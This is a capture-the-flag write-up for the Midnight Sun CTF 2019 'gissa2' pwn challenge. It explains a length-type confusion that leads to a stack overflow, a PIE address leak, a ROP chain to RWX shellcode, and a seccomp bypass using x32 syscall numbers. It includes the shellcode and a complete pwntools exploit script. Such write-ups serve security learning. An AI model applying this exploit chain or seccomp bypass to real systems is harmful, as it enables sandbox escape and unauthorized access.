# Writeup for gissa2 (pwn, 631 pts, 15 solves), Midnight Sun CTF 2019 Quals

> Last year some dirty hackers found a way around my guessing challenge, well I patched the issue. Can you guess again?
>
> Service: nc gissa-igen-01.play.midnightsunctf.se 4096
>
> Download: [gissa_igen.tar.gz](https://s3.eu-north-1.amazonaws.com/dl.2019.midnightsunctf.se/529C928A6B855DC07AEEE66037E5452E255684E06230BB7C06690DA3D6279E4C/gissa_igen.tar.gz)

## Analysis

The provided binary first `mmap`s the flag and then lets us try to guess it.
After mapping the flag, the binary also installs a seccomp filter which forbids the system calls `open`, `clone`, `fork`, `vfork`, `execve`, `creat`, `openat` and `execveat`.

The length of the buffer our input is read to is stored in the `main()` function as a `uint16_t`, but a pointer to this length is passed to the `guess_flag()` function as a `uint32_t *`.
Right after the buffer length the current number of tries is stored, so when `guess_flag()` accesses the buffer length, it actually uses both of these values.
This has the effect that on our first guess, the buffer length has the correct value of 0x8b, but on the second guess, the buffer length has increased to 0x1008b, which leads to a stack buffer overflow.

## Exploit: ROP

No canary is used, so we can easily overwrite the return address. The only problem left before we can execute a ROP chain is that we don't know the binary's base address (it's a PIE).
But that's easily solved: because the binary doesn't terminate our input string, we can leak the original return address before sending our ROP chain.
However, when we gain control of the execution flow, the flag has already been unmapped and its file descriptor closed.
There's no way for us to divert the execution flow before that point, so we have to find a way to bypass the seccomp filter.

## ROP to Shellcode

To ease bypassing of the seccomp filter, let's first set up a ROP chain to get shellcode execution.
The ROP chain is pretty straightforward: map some RWX memory at a fixed address, read our next input into it, and jump there.

```python
sc_addr = 0x1337000
rop = rop_call(binary + off_mmap, sc_addr, 0x10000, 7, 0x32, -1, 0)
rop += rop_call(binary + off_read, 0, sc_addr, 0x10000)
rop += p64(sc_addr)
```

## Bypass seccomp Filter

Now that we can execute shellcode, the only thing left is somehow bypassing the seccomp filter in order to read the flag.
Here's the filter used:

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0008
 0007: 0x06 0x00 0x00 0x00000000  return KILL
 0008: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0010
 0009: 0x06 0x00 0x00 0x00000000  return KILL
 0010: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0012
 0011: 0x06 0x00 0x00 0x00000000  return KILL
 0012: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0014
 0013: 0x06 0x00 0x00 0x00000000  return KILL
 0014: 0x15 0x00 0x01 0x00000055  if (A != creat) goto 0016
 0015: 0x06 0x00 0x00 0x00000000  return KILL
 0016: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0018
 0017: 0x06 0x00 0x00 0x00000000  return KILL
 0018: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0020
 0019: 0x06 0x00 0x00 0x00000000  return KILL
 0020: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

The filter checks the current architecture, so we cannot bypass it by switching to 32-bit mode
However, if we set bit 30 of the syscall number, we can access the 'x32' syscall ABI, which provides basically the same system calls and is not blocked by the seccomp filter.
Thus, using syscall 0x40000002 instead of 2 for open lets us open and print the flag.

```asm
# open(0x1338000, 0, 0) - 0x1338000 contains the path
mov rax, 0x40000002
mov rdi, 0x1338000
mov rsi, 0
mov rdx, 0
syscall

# read(flag, 0x1338000, 0x100)
mov rdi, rax
mov rax, 0
mov rsi, 0x1338000
mov rdx, 0x100
syscall

# write(1, 0x1338000, 0x100)
mov rax, 1
mov rdi, 1
mov rsi, 0x1338000
mov rdx, 0x100
syscall
```

Flag: `midnight{I_kN3w_1_5H0ulD_h4v3_jUst_uS3d_l1B5eCC0mP}`

## Exploit Code

```python
from pwn import *

context.binary = 'gissa_igen'

shellcode = asm('''
    mov rax, 0x40000002
    mov rdi, 0x1338000
    mov rsi, 0
    mov rdx, 0
    syscall

    mov rdi, rax
    mov rax, 0
    mov rsi, 0x1338000
    mov rdx, 0x100
    syscall

    mov rax, 1
    mov rdi, 1
    mov rsi, 0x1338000
    mov rdx, 0x100
    syscall
''')

g = remote('gissa-igen-01.play.midnightsunctf.se', 4096)

# increase buf_len
g.sendlineafter('flag (', '')
g.recvuntil('try again')

# overwrite buf_len with 168
g.sendlineafter('flag (', 'A' * 140 + p32(168) + p64(0) * 2)

# leak binary addr
g.sendafter('flag (', 'A' * 140 + '\xff\xff' + '\x01\x01' + 'B' * 8 + '\xff' * 8 + 'C' * 8)
g.recvuntil('C' * 8)
binary = u64(g.recvuntil(' is not right', drop=True).ljust(8, '\0')) - 0xbc5
info("binary @ 0x%x", binary)

# ROP to shellcode

def rop_call(func, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
    return flat(binary + 0xc1f, rcx, 0, 0, 0, binary + 0xc1d, rdx, r9, r8, rdi, rsi, func)

sc_addr = 0x1337000
# mmap
rop = rop_call(binary + 0xc0c, sc_addr, 0x10000, 7, 0x32, -1, 0)
# read
rop += rop_call(binary + 0xbd4, 0, sc_addr, 0x10000)
rop += p64(sc_addr)
g.sendlineafter('flag (', 'A' * 168 + rop)

g.sendafter('not right.\n', shellcode.ljust(0x1000, '\0') + '/home/ctf/flag\0')

g.interactive()
```
